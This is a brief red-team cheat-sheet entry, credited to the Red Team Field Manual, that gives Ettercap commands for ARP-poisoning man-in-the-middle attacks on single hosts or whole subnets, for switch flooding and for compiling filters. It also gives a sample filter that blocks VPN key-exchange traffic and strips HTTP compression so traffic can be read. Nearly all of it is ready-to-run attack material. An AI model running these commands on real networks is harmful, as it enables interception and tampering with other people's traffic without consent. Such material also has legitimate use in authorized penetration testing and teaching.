---
name: Ettercap
category: Traffic Analysis & Wireless
description: Ettercap MITM commands, filter compilation and ARP poisoning techniques.
tags: [ettercap, mitm, arp-poisoning, sniffing, RTFM]
---

# Ettercap

Ettercap commands for man-in-the-middle attacks with filters.

## Commands

```bash
# MITM with filter
ettercap.exe -i <IFACE> -M arp -Tq -F file.ef <MAC>/<IP>/<PORTS> <MAC>/<IP>/<PORTS>

# MITM entire subnet with filter
ettercap -T -M arp -F filter.ef // //

# Switch flood
ettercap -TP rand_flood
```

## Compile filter

```bash
etterfilter <ETTER_FILTER> -o out.ef
```

## Sample filter

Kills VPN traffic and decodes HTTP:

```
if (ip.proto == UDP && udp.dst == 500){
  drop();
  kill();
}
if (ip.src == "<IP>"){
  if (tcp.dst == 80){
    if (search(DATA.data, "Accept-Encoding")){
      replace("Accept-Encoding","Accept-Rubbish!");
      msg("Replaced Encoding\n");
    }
  }
}
```

> Source: RTFM — Red Team Field Manual v2
